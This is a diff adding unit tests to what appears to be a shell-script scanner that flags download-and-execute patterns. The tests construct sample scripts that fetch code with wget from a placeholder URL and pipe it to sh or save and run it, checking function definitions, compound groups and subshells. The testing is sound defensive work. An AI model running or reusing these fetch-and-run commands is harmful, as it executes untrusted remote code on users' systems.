@@ -5972,6 +5972,111 @@ class TestACompoundCommandCarriesItsClosingOutput(unittest.TestCase):
             with self.subTest(script=script):
                 self.assert_reported(script)
 
+    def test_3069_a_function_definition_does_not_steal_a_later_compound_close(self):
+        definition = "f() { :; }\n"
+        affected = (
+            definition + "{ %s; } | sh\n" % self.FETCH,
+            definition + "if true; then %s; fi | sh\n" % self.FETCH,
+            definition + ("while read -r x; do %s; done < /dev/null | sh\n"
+                          % self.FETCH),
+            definition + "{ { %s; }; } | sh\n" % self.FETCH,
+            definition + "{ %s; } > tool\nsh tool\n" % self.FETCH,
+            "f() {\n  :\n}\n{ %s; } | sh\n" % self.FETCH,
+            "function f { :; }\n{ %s; } | sh\n" % self.FETCH,
+            definition + "g() { :; }\n{ %s; } | sh\n" % self.FETCH,
+        )
+        for script in affected:
+            self.assert_reported_in_every_shell(script)
+
+        # A subshell never had the missing brace, a definition after the group
+        # cannot affect its close, and command substitution already keeps its
+        # own stream consumer. These reporting controls stay unchanged.
+        controls = (
+            definition + "( %s ) | sh\n" % self.FETCH,
+            "{ %s; } | sh\n" % self.FETCH + definition,
+            definition + 'eval "$({ %s; })"\n' % self.FETCH,
+        )
+        for script in controls:
+            self.assert_reported_in_every_shell(script)
+
+    def test_3069_a_compound_at_the_start_of_a_function_body_stays_balanced(self):
+        definitions = (
+            "f() { if true; then :; fi; }\n",
+            "f() { if true; then :; else :; fi; }\n",
+            "f() { while false; do :; done; }\n",
+            "f() { for i in 1; do :; done; }\n",
+            "f() { until true; do :; done; }\n",
+        )
+        followers = (
+            "{ %s; } | sh\n",
+            "if true; then %s; fi | sh\n",
+            "{ %s; } > tool\nsh tool\n",
+        )
+        for definition in definitions:
+            for follower in followers:
+                self.assert_reported_in_every_shell(
+                    definition + follower % self.FETCH
+                )
+
+        # A nested one-line function definition is #2975 part A: the
+        # function table cannot yet hold its inner header. Keep that separate
+        # limit CLEAN rather than treating its `{` as an ordinary group.
+        nested = "f() { g() { :; }; }\n"
+        for follower in followers:
+            self.assert_clean_in_every_shell(nested + follower % self.FETCH)
+
+    def test_3069_an_inherited_output_keeps_wgets_expansion_unresolved(self):
+        url = "https://example.test/i.sh"
+        group_redirect = "X=-qO-\n{ wget $X %s; } > tool\nsh tool\n" % url
+        group_tee = "X=-qO-\n{ wget $X %s; } | tee tool\nsh tool\n" % url
+        group_discard = ("X='-O tool'\n{ wget $X %s; } > /dev/null\n"
+                         "sh tool\n") % url
+        reports = (
+            ("r3087.x.def-grp-wgetX-redir", "f() { :; }\n" + group_redirect),
+            ("r3087r2.x.def-qO-grp-redir", "f() { :; }\n" + group_redirect),
+            ("r3087r2.x.def-tee", "f() { :; }\n" + group_tee),
+            ("r3087r2.x.def-O-grp-devnull", "f() { :; }\n" + group_discard),
+            ("r3087r2.x.defif-qO-grp-redir",
+             "f() { if true; then :; fi; }\n" + group_redirect),
+            ("r3087r3.twin.qO-grp-redir", group_redirect),
+            ("r3087r3.twin.qO-grp-tee", group_tee),
+            ("r3087r3.twin.O-grp-devnull", group_discard),
+            # #3034's accepted price: the expansion may name a destination;
+            # under X=-qO- this harmless inherited pipe would run no `tool`.
+            ("r3087r3.price.grp-cat",
+             "X=-qO-\n{ wget $X %s; } | cat\nsh tool\n" % url),
+        )
+        for row, script in reports:
+            with self.subTest(row=row):
+                self.assert_reported_in_every_shell(script)
+
+        # Only an enclosing compound's route keeps the fail-closed #3034
+        # reading. A fetch stage's own redirects and pipe stay #3035's limit.
+        own_outputs = (
+            "X=-qO-\nwget $X %s > tool\nsh tool\n" % url,
+            "X=-qO-\nwget $X %s | tee tool\nsh tool\n" % url,
+            "X='-O tool'\nwget $X %s > /dev/null\nsh tool\n" % url,
+        )
+        for script in own_outputs:
+            self.assert_clean_in_every_shell(script)
+
+    def test_3069_a_subshell_close_keeps_wgets_expansion_unresolved(self):
+        url = "https://example.test/i.sh"
+        reports = (
+            ("r3087r4.subshell.outer-redir",
+             "X=-qO-\n( wget $X %s ) > tool\nsh tool\n" % url),
+            ("r3087r4.subshell.outer-devnull",
+             "X='-O tool'\n( wget $X %s ) > /dev/null\nsh tool\n" % url),
+            # The reader attaches a subshell's trailing redirect to its inner
+            # stage, so it cannot distinguish this stage-owned spelling. Keep
+            # the fail-closed REPORT as #3034's named subshell fallback price.
+            ("r3087r4.price.subshell-inner-redir",
+             "X=-qO-\n( wget $X %s > tool )\nsh tool\n" % url),
+        )
+        for row, script in reports:
+            with self.subTest(row=row):
+                self.assert_reported_in_every_shell(script)
+
     def test_a_redirected_compound_does_not_hide_an_inner_subshell_stream(self):
         for script in (
                 "{ ( %s; ) | sh; } > log\n" % self.FETCH,
